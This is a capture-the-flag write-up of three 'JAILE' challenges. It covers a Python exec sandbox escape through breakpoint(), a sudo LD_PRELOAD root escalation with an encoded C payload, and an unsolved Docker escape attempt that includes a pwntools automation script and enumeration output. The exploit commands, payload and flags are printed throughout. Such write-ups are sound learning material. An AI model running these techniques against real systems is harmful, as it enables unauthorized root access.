# JAILE

## [★★☆] JAILE - Calculator

### Description

You have found an exposed calculator program. It doesn’t seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. Can you make this application more useful? Python version is 3.12.3

Service: exp.cybergame.sk:7002

Download: [calc.py](https://ctf-world.cybergame.sk/files/14bfeba338752115e61f54d22de26b5c/calc.py?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEzfQ.aAvkAQ.l55PPOX00WlN-RZPAQFAV0hLaKY "calc.py")

### Source

```python
import socket
import os
import pty
import sys

def handle_client(conn):
    s_fd = conn.fileno()
    os.dup2(s_fd, 0)
    os.dup2(s_fd, 1)
    os.dup2(s_fd, 2)
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    text = data.decode().strip()

    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    # Check for forbidden characters.
    for character in ['\'', '\"']:
        if character in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    try:
        exec('print(' + text + ')')
    except Exception as e:
        conn.sendall(("Error: " + str(e) + "\n").encode())

def main():
    host = '0.0.0.0'
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}")
        conn, addr = s.accept()  # Handle one connection.
        with conn:
            print(f"Connection from {addr}")
            handle_client(conn)
    sys.exit(0)

if __name__ == "__main__":
    main()
```

### Solution

We are given a python program which takes our input and passes it to `exec('print(' + text + ')')`
```bash
└─$ nc exp.cybergame.sk 7002
>> 1+1
2
```

[https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html)

Initially I was thinking of exploiting `__builtins__`, but then realized that `breakpoint` is not blacklisted so......
```bash
└─$ nc exp.cybergame.sk 7002
>> breakpoint()
None
--Return--
> <string>(1)<module>()->None
(Pdb) os.system('id')
uid=1000(calc) gid=1000(calc) groups=1000(calc)
0
(Pdb) os.system('ls -alh')
total 32K
drwxr-xr-x 1 calc calc 4.0K Mar 31 20:22 .
drwxr-xr-x 1 root root 4.0K Mar 31 20:01 ..
-rw-r--r-- 1 calc calc  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 calc calc 3.5K Apr 23  2023 .bashrc
-rw-r--r-- 1 calc calc  807 Apr 23  2023 .profile
-rw-rw-r-- 1 root root   38 Mar 31 16:53 flag.txt
-rw-rw-r-- 1 root root 1.8K Mar 31 20:22 main.py
0
(Pdb) os.system('cat ./flag.txt')
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
0
```

## [★★☆] JAILE - User

### Description

That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.

### Solution

Using the `breakpoint` like above upgrade the shell to `bash` since quoting is painful.

```bash
(Pdb) os.system('bash')
id
uid=1000(calc) gid=1000(calc) groups=1000(calc)
python3 -c 'import pty;pty.spawn("/bin/bash")'
calc@aed68215d20d:~$ sudo -l
sudo -l
Matching Defaults entries for calc on aed68215d20d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD

User calc may run the following commands on aed68215d20d:
    (ALL) NOPASSWD: /bin/netstat
```

[https://gtfobins.github.io](https://gtfobins.github.io) doesn't have anything about `netstat` so probably not exploitable. `env_keep+=LD_PRELOAD` is definitely dangerous

[https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path)

```bash
calc@aed68215d20d:~$ base64 -d <<<'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQoNCnZvaWQgX2luaXQoKSB7DQogICAgdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsNCiAgICBzZXRnaWQoMCk7DQogICAgc2V0dWlkKDApOw0KICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7DQp9DQo=' > /tmp/exp.c

calc@aed68215d20d:~$ cat /tmp/exp.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

calc@aed68215d20d:~$ cd /tmp
calc@aed68215d20d:/tmp$ gcc -fPIC -shared -o pe.so exp.c -nostartfiles
calc@aed68215d20d:/tmp$ sudo  LD_PRELOAD=./pe.so netstat
root@aed68215d20d:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@aed68215d20d:/tmp# cd
root@aed68215d20d:~# ls -l
total 4
-rw-rw-r-- 1 root root 40 Mar 31 16:57 flag.txt
root@aed68215d20d:~# cat flag.txt
SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}
```

::: tip Flag
`SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}`
:::

```
nc exp.cybergame.sk 7002
breakpoint()
os.system('bash')
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /tmp
base64 -d <<<'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQoNCnZvaWQgX2luaXQoKSB7DQogICAgdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsNCiAgICBzZXRnaWQoMCk7DQogICAgc2V0dWlkKDApOw0KICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7DQp9DQo=' > /tmp/exp.c
gcc -fPIC -shared -o pe.so exp.c -nostartfiles
sudo  LD_PRELOAD=./pe.so netstat
export TERM=xterm
```

## \[★★☆\] JAILE - Final Escape

### Description

You are root, but it seems you are inside a Docker container. Can you escape somehow once again?

**Disclaimer**: Was not able to solve it in time :(

### Solution

Before we start, I used the following script to get back in the machine as root automatically.

```python
from argparse import ArgumentParser
from base64 import b64encode
from bz2 import compress
from textwrap import wrap
from pwn import *
from pathlib import Path
import requests

context.terminal = ['bash']
context.log_level = 'INFO'

HOST, PORT = 'exp.cybergame.sk', 7002
PRIV_ESC = '''
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
'''
COMMANDS = [
    "breakpoint()",
    "os.system('bash')",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "cd /tmp",
    f"base64 -d <<<'{b64encode(PRIV_ESC.encode()).decode()}' > exp.c",
    "gcc -fPIC -shared -o pe.so exp.c -nostartfiles",
    "sudo LD_PRELOAD=./pe.so netstat",
    "export TERM=xterm; clear",
]

def unpack_commands(filename):
    return [
        f'cd /tmp',
        f'base64 -d /tmp/{filename}.bz2.base64 > /tmp/{filename}.bz2',
        f'bzip2 -d /tmp/{filename}.bz2',
        f'chmod +x /tmp/{filename}',
    ]

def upload(io, filepath, chunk_size=400):
    if filepath.startswith('http'):
        log.info(f"Downloading from URL: {filepath}")
        data = requests.get(filepath).content
    else:
        log.info(f"Reading local file: {filepath}")
        with open(filepath, 'rb') as f:
            data = f.read()
            
    filename = Path(filepath).name
    b64_data = b64encode(compress(data)).decode()
    
    log.info(f"Uploading {filename} in chunks (size: {len(data)} bytes, chunked size: {len(b64_data)}) bytes)")
    io.sendline(f'rm /tmp/{filename}* 2>/dev/null'.encode())
    io.recv(timeout=1)
    
    for i, chunk in enumerate(wrap(b64_data, chunk_size)):
        log.info(f"Chunk: {i+1} - {i * chunk_size}-{(i+1) * chunk_size}")
        io.sendline(f'echo "{chunk}" >> /tmp/{filename}.bz2.base64'.encode())
        io.recv(timeout=1)

    log.info(f"Decompressing file")
    for cmd in unpack_commands(filename):
        log.info(f"Running: {cmd}")
        io.sendline(cmd.encode())
        io.recv(timeout=1)

    log.success(f"File uploaded /tmp/{filename}")

def main(files, chunk_size):
    io = remote(HOST, PORT)
    io.recvuntil(b">> ", timeout=3)

    for cmd in COMMANDS:
        log.info(f"Running: {cmd}")
        io.sendline(cmd.encode())
        io.recv(timeout=1)

    if files:
        for file in files:
            upload(io, file, chunk_size)

    log.success("Entering interactive shell...")
    io.interactive()

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-f', '--files',  nargs='+', default=None, help='Path to the file to upload (local or URL)')
    parser.add_argument('-c', '--chunk-size', default=400, help='Chunk size for uploading (default: 400)')

    args = parser.parse_args()
    main(args.files, args.chunk_size)

# ➜ py '.\JAILE - Final Escape.py' # Connects
# ➜ py '.\JAILE - Final Escape.py' -f .\file.py # Connects and uploads file.py
# ➜ py '.\JAILE - Final Escape.py' -f .\file.py .\file.py # Connects and uploads file.py, file2.py
```

> **Note**: Each connections spawns new container, nothing is same (AFAIK)

We are indeed inside a Container and have to escape somehow.
```bash
root@8e33ac342f06:/tmp# ls -alh /.dockerenv 
-rwxr-xr-x 1 root root 0 Apr 29 13:09 /.dockerenv
```

`docker.sock` exists, but not `docker` command.
```bash
root@8e33ac342f06:/tmp# find / -name docker.sock -ls 2>/dev/null 
  1290254      0 srw-rw----   1 root     root            0 Apr 27 12:37 /run/docker/docker.sock
```

1. [deepce/guides/docker-sock.md](https://github.com/stealthcopter/deepce/blob/main/guides/docker-sock.md)
2. [PwnPeter/exploit-docker-sock.sh](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)
3. [https://swisskyrepo.github.io/InternalAllTheThings/containers/docker/](https://swisskyrepo.github.io/InternalAllTheThings/containers/docker/)

It's possible to interact with the docker api using `docker.sock` over HTTP.

But the API is responding with **Not Found** message instead of Docker API responses.
```bash
root@8e33ac342f06:/tmp# curl --unix-socket /run/docker/docker.sock http://localhost/version;echo
{"message":"Not Found"}
root@8e33ac342f06:/tmp# curl -s --unix-socket /run/docker/docker.sock http://localhost/images/json;echo
{"message":"Not Found"}
```

We might not even be talking to Docker API at all... 🤔 `uvicorn` is a Python ASGI server, usually used to run **FastAPI** or **Starlette** apps.
```bash
root@8e33ac342f06:/tmp# curl --unix-socket /run/docker/docker.sock http://localhost/ -v;echo
*   Trying /run/docker/docker.sock:0...
* Connected to localhost (/opt/docker.sock) port 80 (#0)
> GET / HTTP/1.1
> Host: localhost
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 404 Not Found
< date: Tue, 29 Apr 2025 13:19:07 GMT
< server: uvicorn
< content-length: 23
< content-type: application/json
<
* Connection #0 to host localhost left intact
{"message":"Not Found"}
```

There are some odd paths in `mount`,
```bash
root@06b5e9ced3a4:/tmp# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/QTII42APC5GZP6J67A6C3PVZ5Y:/var/lib/docker/overlay2/l/D6GKS2UAOTTCTFTMTREH3A7BBB:/var/lib/docker/overlay2/l/VZJ5HHM2X7SXTFO7U3BYIKAEJA:/var/lib/docker/overlay2/l/QKJIM6ACGVHW3PJIHNNUMNBFK2:/var/lib/docker/overlay2/l/BJIJ3PSWM6PBHESA47K54G45QB:/var/lib/docker/overlay2/l/4WVUHLQ33XLCOEMLCWDDXU4VMO:/var/lib/docker/overlay2/l/HFEFG6DO7XCSPJP3JJ27F4UJLB:/var/lib/docker/overlay2/l/WSWMU34NNQPVGAWHQXUW7VU5A3:/var/lib/docker/overlay2/l/2P72PEALAMILXMMXAID5OUWNUN:/var/lib/docker/overlay2/l/MLXGNX2PSDYXFE5D6HIQZJDTYW:/var/lib/docker/overlay2/l/MCJNWFM4NW2ZEVUJL26FBZXB5L:/var/lib/docker/overlay2/l/FRL63CTEG7I5ZB4VW5ZXPDCRU3:/var/lib/docker/overlay2/l/6MICBZQWTH7AZZUS4EYAIDYUXG:/var/lib/docker/overlay2/l/EXIUC3UPWWVFC4MH7RYNR47TWV:/var/lib/docker/overlay2/l/NKDRE4FAU4L55RNF7KI2DCQVXX:/var/lib/docker/overlay2/l/GXC7B5WPM7XCUSQH6JNNPUJD7F:/var/lib/docker/overlay2/l/EPMXYRSFI3O7G435PL5L6P6PWA:/var/lib/docker/overlay2/l/DQYNGUI473KKLEH4V7FPLPWCS6,upperdir=/var/lib/docker/overlay2/c4064126766d4292061ae35b258287ca062ce1e9dbec04e60ace42110fdcafbc/diff,workdir=/var/lib/docker/overlay2/c4064126766d4292061ae35b258287ca062ce1e9dbec04e60ace42110fdcafbc/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/vda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/vda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/vda1 on /run/docker type ext4 (ro,relatime,discard,errors=remount-ro)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
tmpfs on /sys/devices/virtual/powercap type tmpfs (ro,relatime,inode64)
```

I even tried getting [deepce](https://github.com/stealthcopter/deepce) on the box to enumerate further, but nothing promising.
```bash
root@d8458bedf3e2:/tmp# ./deepce.sh
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. Yes
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
calc ALL=(ALL) NOPASSWD: /bin/netstat
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ d8458bedf3e2
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.21.1.74 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.21.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-131-generic
[+] Arch .................... x86_64
[+] CPU ..................... Intel Xeon Processor (Skylake, IBRS)
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
/usr/bin/hostname
/usr/local/bin/python
/usr/local/bin/python3
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
> This can be decoded with: "capsh --decode=00000000a80425fb"
[+] SSHD Service ............ No
[+] Privileged Mode ......... Unknown
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... Yes
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
lrwxrwxrwx 1 root root  19 Feb 19  2023 /lib/tclConfig.sh -> tcl8.6/tclConfig.sh
lrwxrwxrwx 1 root root  21 Feb 19  2023 /lib/tclooConfig.sh -> tcl8.6/tclooConfig.sh
lrwxrwxrwx 1 root root  17 Feb 19  2023 /lib/tkConfig.sh -> tk8.6/tkConfig.sh
-rwxr-xr-x 1 root root 39K Apr 29 17:08 /tmp/deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 4.0K
drwxr-xr-x 1 calc calc 4.0K Mar 31 20:22 calc
[+] Hashes in shadow file ............... No
[+] Searching for app dirs ..............
```

I'll ignore it for the moment the capabilities
```bash
└─$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

The `vda*` is suspicious and the `findmnt` command shows from volume name that it's in fact a **fake socket** :/
```bash
root@806400d8fca9:/tmp# lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS     
loop0     7:0    0 63.9M  1 loop
loop1     7:1    0   87M  1 loop
loop2     7:2    0 38.8M  1 loop
sr0      11:0    1 1024M  0 rom
vda     252:0    0  100G  0 disk
├─vda1  252:1    0 99.9G  0 part /run/docker     
│                                /etc/hosts      
│                                /etc/hostname   
│                                /etc/resolv.conf
├─vda14 252:14   0    4M  0 part
└─vda15 252:15   0  106M  0 part
root@806400d8fca9:/tmp# findmnt
TARGET                  SOURCE               FSTYPE  OPTIONS
/                       overlay              overlay rw,relatime,lowerdir=/var/l
├─/proc                 proc                 proc    rw,nosuid,nodev,noexec,rela
│ ├─/proc/bus           proc[/bus]           proc    ro,nosuid,nodev,noexec,rela
│ ├─/proc/fs            proc[/fs]            proc    ro,nosuid,nodev,noexec,rela
│ ├─/proc/irq           proc[/irq]           proc    ro,nosuid,nodev,noexec,rela
│ ├─/proc/sys           proc[/sys]           proc    ro,nosuid,nodev,noexec,rela
│ ├─/proc/sysrq-trigger proc[/sysrq-trigger] proc    ro,nosuid,nodev,noexec,rela
│ ├─/proc/acpi          tmpfs                tmpfs   ro,relatime,inode64
│ ├─/proc/kcore         tmpfs[/null]         tmpfs   rw,nosuid,size=65536k,mode=
│ ├─/proc/keys          tmpfs[/null]         tmpfs   rw,nosuid,size=65536k,mode=
│ ├─/proc/timer_list    tmpfs[/null]         tmpfs   rw,nosuid,size=65536k,mode=
│ └─/proc/scsi          tmpfs                tmpfs   ro,relatime,inode64
├─/dev                  tmpfs                tmpfs   rw,nosuid,size=65536k,mode=
│ ├─/dev/pts            devpts               devpts  rw,nosuid,noexec,relatime,g
│ ├─/dev/mqueue         mqueue               mqueue  rw,nosuid,nodev,noexec,rela
│ └─/dev/shm            shm                  tmpfs   rw,nosuid,nodev,noexec,rela
├─/sys                  sysfs                sysfs   ro,nosuid,nodev,noexec,rela
│ ├─/sys/firmware       tmpfs                tmpfs   ro,relatime,inode64
│ ├─/sys/devices/virtual/powercap
│ │                     tmpfs                tmpfs   ro,relatime,inode64
│ └─/sys/fs/cgroup      cgroup               cgroup2 ro,nosuid,nodev,noexec,rela
├─/etc/resolv.conf      /dev/vda1[/var/lib/docker/containers/806400d8fca98ea529df7b23ea1eb8ec7f15fc07df80d800ddeda96da5bdc6f5/resolv.conf]
│                                            ext4    rw,relatime,discard,errors=
├─/etc/hostname         /dev/vda1[/var/lib/docker/containers/806400d8fca98ea529df7b23ea1eb8ec7f15fc07df80d800ddeda96da5bdc6f5/hostname]
│                                            ext4    rw,relatime,discard,errors=
├─/etc/hosts            /dev/vda1[/var/lib/docker/containers/806400d8fca98ea529df7b23ea1eb8ec7f15fc07df80d800ddeda96da5bdc6f5/hosts]
│                                            ext4    rw,relatime,discard,errors=
└─/run/docker           /dev/vda1[/opt/cybergame/volumes/fake-docker-socket]
                                             ext4    ro,relatime,discard,errors=
```

😢...
```bash
root@1ecce639ccbb:/tmp# curl --unix-socket /run/docker/docker.sock http://localhost/docs
    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>FastAPI - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

```json
curl --unix-socket /run/docker/docker.sock http://localhost/openapi.json;echo
{
    "openapi": "3.1.0",
    "info": {
        "title": "FastAPI",
        "version": "0.1.0"
    },
    "paths": {
        "/v1.48/containers/json": {
            "get": {
                "summary": "List Containers",
                "description": "Placeholder function to list containers.",
                "operationId": "list_containers_v1_48_containers_json_get",
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": { "application/json": { "schema": {} }
                        }
                    }
                }
            }
        },
        "/v1.48/containers/{container_id}/json": {
            "get": {
                "summary": "Inspect Container",
                "description": "Placeholder function to inspect a container.",
                "operationId": "inspect_container_v1_48_containers__container_id__json_get",
                "parameters": [
                    {
                        "name": "container_id",
                        "in": "path",
                        "required": true,
                        "schema": { "type": "string", "title": "Container Id" }
                    }
                ],
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": { "application/json": { "schema": {} } }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } } } 
                    }
                }
            }
        },
        "/v1.48/images/list": {
            "get": {
                "summary": "List Images",
                "description": "Placeholder function to list images.",
                "operationId": "list_images_v1_48_images_list_get",
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": { "application/json": { "schema": {} } }
                    }
                }
            }
        },
        "/v1.48/{full_path}": {
            "post": {
                "summary": "Default Docker Handler",
                "description": "Handle unnecessary Docker API endpoints.",
                "operationId": "default_docker_handler_v1_48__full_path__post",
                "parameters": [
                    {
                        "name": "full_path",
                        "in": "path",
                        "required": true,
                        "schema": { "type": "string", "title": "Full Path" }
                    }
                ],
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": { "application/json": { "schema": {} } }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } } }
                    }
                }
            },
            "put": {
                "summary": "Default Docker Handler",
                "description": "Handle unnecessary Docker API endpoints.",
                "operationId": "default_docker_handler_v1_48__full_path__post",
                "parameters": [
                    {
                        "name": "full_path",
                        "in": "path",
                        "required": true,
                        "schema": { "type": "string", "title": "Full Path" }
                    }
                ],
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": { "application/json": { "schema": {} } }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } }
                        }
                    }
                }
            },
			"delete": {
			    "summary": "Default Docker Handler",
			    "description": "Handle unnecessary Docker API endpoints.",
			    "operationId": "default_docker_handler_v1_48__full_path__post",
			    "parameters": [
			        {
			            "name": "full_path",
			            "in": "path",
			            "required": true,
			            "schema": { "type": "string", "title": "Full Path" }
			        }
			    ],
			    "responses": {
			        "200": {
			            "description": "Successful Response",
			            "content": { "application/json": { "schema": {} } }
			        },
			        "422": {
			            "description": "Validation Error",
			            "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } } }
			        }
			    }
			},
			"patch": {
	            "summary": "Default Docker Handler",
	            "description": "Handle unnecessary Docker API endpoints.",
	            "operationId": "default_docker_handler_v1_48__full_path__post",
	            "parameters": [
	                {
	                    "name": "full_path",
	                    "in": "path",
	                    "required": true,
	                    "schema": { "type": "string", "title": "Full Path" }
	                }
	            ],
	            "responses": {
	                "200": {
	                    "description": "Successful Response",
	                    "content": { "application/json": { "schema": {} } }
	                },
	                "422": {
	                    "description": "Validation Error",
	                    "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } }
	                    }
	                }
	            }
	        },
	        "get": {
	            "summary": "Default Docker Handler",
	            "description": "Handle unnecessary Docker API endpoints.",
	            "operationId": "default_docker_handler_v1_48__full_path__post",
	            "parameters": [
	                {
	                    "name": "full_path",
	                    "in": "path",
	                    "required": true,
	                    "schema": { "type": "string", "title": "Full Path" }
	                }
	            ],
	            "responses": {
	                "200": {
	                    "description": "Successful Response",
	                    "content": { "application/json": { "schema": {} }
	                    }
	                },
	                "422": {
	                    "description": "Validation Error",
	                    "content": { "application/json": { "schema": { "$ref": "#/components/schemas/HTTPValidationError" } }
	                    }
	                }
	            }
	        }
	    }
	},
    "components": { ... }
}
```

```json
root@50bd0a164557:/tmp# curl -s --unix-socket /run/docker/docker.sock http://localhost/v1.48/containers/json | python3 -m json.tool     
[
    {
        "Id": "2ac0095bb75a0409ede98e558b3c7bb5d608808309deb58dce90be4464b2383f",
        "Names": [ "/nginx" ],
        "Image": "nginx-local-build",
        "ImageID": "sha256:58e7093d2609a796d74a477963dd9f8d0831e5cc907f6183ac4d45a2ec732c68",
        "Command": "docker-entrypoint.sh",
        "Created": 1738763324,
        Ports: [
            { IP: "0.0.0.0", PrivatePort: 80, PublicPort: 8080, Type: "tcp" },
            { IP: "::", PrivatePort: 80, PublicPort: 8080, Type: "tcp" },
        ],
        "Labels": {},
        "State": "running",
        "Status": "Up 41 days",
        "HostConfig": { "NetworkMode": "nginx_default" },
        "NetworkSettings": {
            "Networks": {
                "nginx_default": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": null,
                    "MacAddress": "02:42:ac:13:00:02",
                    "DriverOpts": null,
                    "NetworkID": "2e86497ce39b9ae0fca946bd34121db731e219013f207f4e623a2d1119554abc",
                    "EndpointID": "28c706b3f6ad6629adbd8028d23db11543b9958ea0723408658db78b98a55d68",
                    "Gateway": "172.19.0.1",
                    "IPAddress": "172.19.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "DNSNames": null
                }
            }
        },
        "Mounts": []
    },
    {
        "Id": "1c4e282bd906b7f9da8e73800f4b85b176f84b1bbd6991ab5a6bf8ffb1df97ec",
        "Names": [ "/database" ],
        "Image": "postgres:latest",
        "ImageID": "sha256:2bc651475271ecc2071a93af97d66402becb798c69d03987e69977e6a821a30e",
        "Command": "/docker-entrypoint.sh",
        "Created": 1721395930,
        "Ports": [],
        "Labels": {},
        "State": "running",
        "Status": "Up 36 days",
        "HostConfig": { "NetworkMode": "database_default" },
        "NetworkSettings": {
            "Networks": {
                "database_default": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": null,
                    "MacAddress": "02:42:ac:12:00:02",
                    "DriverOpts": null,
                    "NetworkID": "0e3b600f2602d140cd3786ac3f98c27327e9cd2ccfaca35ba33078a1840444c3",
                    "EndpointID": "04837c592f94727cda597e85d915ae93bbab6902c5230c44249951d8a1f7067a",
                    "Gateway": "172.18.0.1",
                    "IPAddress": "172.18.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "DNSNames": null
                }
            }
        },
        "Mounts": [
            {
                "Type": "bind",
                "Source": "/home/user/cert.pem",
                "Destination": "/opt/certs/ca.pem",
                "Mode": "ro",
                "RW": false,
                "Propagation": "rprivate"
            }
        ]
    }
]
```

We are only allowed to inspect the containers, so there must be some hidden detail. Get all Container IDs and get details
```bash
root@345c0e048e94:/tmp# curl -s --unix-socket /run/docker/docker.sock http://localhost/v1.48/images/list | python3 -m json.tool | grep '"Id"' | grep -oE '[a-f0-9]{64}'
d56951e5ba9a543cca5721071abbaa15b2da22ff229ad07a2fa63c2c37b7bfe7
034af2a8ca26fa7c003350e75884d0e6729ddee0a389dfdd14888c49959addb6
58e7093d2609a796d74a477963dd9f8d0831e5cc907f6183ac4d45a2ec732c68
2bc651475271ecc2071a93af97d66402becb798c69d03987e69977e6a821a30e
oot@345c0e048e94:/tmp# for id_ in $(!!); do curl -s --unix-socket /run/docker/docker.sock http://localhost/v1.48/containers/$id_/json;echo;done;
{"message":"Not Found"}
{"message":"Not Found"}
{"message":"Not Found"}
{"message":"Not Found"}
```

